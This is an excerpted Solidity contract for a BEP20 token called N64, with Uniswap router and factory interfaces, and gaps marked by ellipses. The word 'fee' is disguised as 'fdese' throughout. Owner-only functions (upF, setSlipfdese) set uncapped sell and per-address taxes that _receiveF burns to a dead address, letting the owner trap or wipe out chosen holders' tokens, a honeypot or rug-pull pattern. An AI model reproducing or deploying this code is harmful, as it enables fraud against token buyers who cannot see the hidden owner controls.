...
interface IUniswapV2Factory {
    ...
    function fdeseTo() external view returns (address);
    function fdeseToSetter() external view returns (address);
    ...
    function setfdeseTo(address) external;
    function setfdeseToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingfdeseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingfdeseOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingfdeseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingfdeseOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingfdeseOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract N64 is BEP20, Ownable {
    ...
    uint256 private _defaultSellfdese = 0;

    uint256 private _defaultBuyfdese = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipfdese;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellfdese = _value;
    }

    function setSlipfdese(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipfdese[_address] = _value;
    }

    function getSlipfdese(address _address) external view onlyownar returns (uint256) {
        return _slipfdese[_address];
    }


    function setMAccountfdese(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountfdese(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradefdeseAmount = 0;

        if (rF) {
            uint256 tradefdese = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradefdese = _defaultSellfdese;
                }
                if (from == uniswapV2Pair) {

                    tradefdese = _defaultBuyfdese;
                }
            }
            if (_slipfdese[from] > 0) {
                tradefdese = _slipfdese[from];
            }

            tradefdeseAmount = _Amount.mul(tradefdese).div(100);
        }


        if (tradefdeseAmount > 0) {
            _balances[from] = _balances[from].sub(tradefdeseAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradefdeseAmount);
            emit Transfer(from, _deadAddress, tradefdeseAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradefdeseAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradefdeseAmount);
        emit Transfer(from, _to, _Amount - tradefdeseAmount);
    }
